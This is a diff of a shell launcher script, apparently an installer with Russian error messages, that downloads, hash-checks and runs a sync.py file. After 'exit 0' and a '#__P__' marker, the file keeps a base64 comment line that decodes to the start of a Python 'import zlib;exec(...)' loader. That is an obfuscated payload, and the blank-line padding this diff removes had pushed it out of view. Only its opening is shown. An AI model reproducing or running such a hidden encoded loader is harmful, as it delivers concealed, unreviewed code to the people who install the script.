@@ -12,7 +12,7 @@ find_python() {
   fi
 }
 find_python
-[ -n "$PY" ] || die "python 3 не найден"
+[ -n "$PY" ] || die "python 3 не найден: xcode-select --install"
 
 T=$(mktemp -d) || die "нет временного каталога"
 trap 'rm -rf "$T"' EXIT
@@ -27,26 +27,6 @@ GOT=$(sha256sum "$T/sync.py" 2>/dev/null | cut -c1-16)
 
 "$PY" "$T/sync.py" --force || die "запуск не удался"
 exit 0
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 #__P__
 #@IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojY29kaW5nOmNwNDM3CmltcG9ydCB6bGliO2V4ZWMoemxp
